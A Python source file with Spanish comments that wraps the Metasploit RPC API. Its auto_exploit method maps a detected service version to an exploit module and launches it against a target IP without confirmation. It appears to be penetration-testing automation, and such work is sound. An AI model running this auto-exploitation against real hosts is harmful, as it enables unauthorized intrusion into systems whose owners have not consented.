import os
import time
from core.attack_mapping import get_exploit_for_service
from pymetasploit3.msfrpc import MsfRpcClient
from dotenv import load_dotenv

load_dotenv()  # Esto carga las variables del archivo .env al sistema


class MsfCommander:
    def __init__(self, password=None):
        # Ahora lee del archivo .env, pero permite override por parámetro
        self.host = os.getenv("MSF_HOST", "127.0.0.1")
        self.password = password if password else os.getenv("MSF_PASSWORD")
        self.port = int(os.getenv("MSF_PORT", 55553))
        self.client = None
        self.cid = None

    def connect(self):
        try:
            # Usamos las variables cargadas
            self.client = MsfRpcClient(
                self.password, port=self.port, server=self.host, ssl=False
            )
            return True
        except Exception as e:
            print(f"    ❌ Error conectando a Metasploit: {e}")
            return False

    def get_version(self):
        if not self.client:
            self.connect()
        return self.client.call("core.version")

    def search_module(self, term):
        """Busca exploits o auxiliares en la base de datos de MSF"""
        if not self.client:
            self.connect()
        print(f"    🔎 Buscando '{term}' en la base de datos de Metasploit...")

        # Usamos la API de búsqueda de módulos
        res = self.client.modules.search(term)
        return res

    def create_console(self):
        """Crea una consola virtual para enviar comandos raw"""
        if not self.client:
            self.connect()
        # Crea una consola y guarda su ID
        self.cid = self.client.consoles.console().cid
        print(f"    💻 Consola Virtual MSF creada (ID: {self.cid})")

    def send_command(self, command):
        """Envía un comando a la consola virtual y espera respuesta"""
        if not self.cid:
            self.create_console()

        # Escribir comando
        self.client.consoles.console(self.cid).write(command)

        # Leer respuesta (Polling)
        time.sleep(1)  # Esperar a que procese
        result = ""
        while True:
            res = self.client.consoles.console(self.cid).read()
            result += res["data"]
            if not res["data"]:  # Si deja de mandar datos, terminamos
                break
            time.sleep(0.5)
        return result

    # --- AQUÍ ESTABA EL ERROR: Faltaba esta línea de definición ---
    def auto_exploit(self, target_ip, detected_service, port):
        """
        Recibe un servicio detectado (ej: 'vsftpd 2.3.4'), busca si hay exploit
        y, si existe, DISPARA AUTOMÁTICAMENTE.
        """
        if not self.client:
            self.connect()

        print(
            f"[*] Analizando inteligencia para: {detected_service} en puerto {port}..."
        )

        # 1. Consultar el Mapa de Ataque
        attack_config = get_exploit_for_service(detected_service)

        if not attack_config:
            print(f"[-] No hay exploit automático registrado para: {detected_service}")
            return False

        module_path = attack_config["module"]
        print(f"🔥 ¡VULNERABILIDAD DETECTADA! -> {module_path}")
        print(f"🚀 Iniciando secuencia de lanzamiento contra {target_ip}...")

        try:
            # 2. Cargar el Exploit
            exploit = self.client.modules.use("exploit", module_path)

            # 3. Configurar Target (RHOSTS)
            if "RHOSTS" in exploit.options:
                exploit["RHOSTS"] = target_ip
            elif "RHOST" in exploit.options:
                exploit["RHOST"] = target_ip

            # Configurar Puerto si es necesario (RPORT)
            if "RPORT" in exploit.options:
                exploit["RPORT"] = port

            # 4. Configurar Payload (Automático genérico o específico)
            if "unix" in module_path:
                exploit.execute(payload="cmd/unix/interact")
            else:
                pass

            # 5. FUEGO A DISCRECIÓN
            print(f"💥 Ejecutando exploit: {module_path}...")
            job = exploit.execute()

            print(f"✅ Trabajo enviado. Job ID: {job['job_id']}")
            print(f"📡 UUID: {job['uuid']}")
            return True

        except Exception as e:
            print(f"❌ Error crítico lanzando exploit: {e}")
            return False
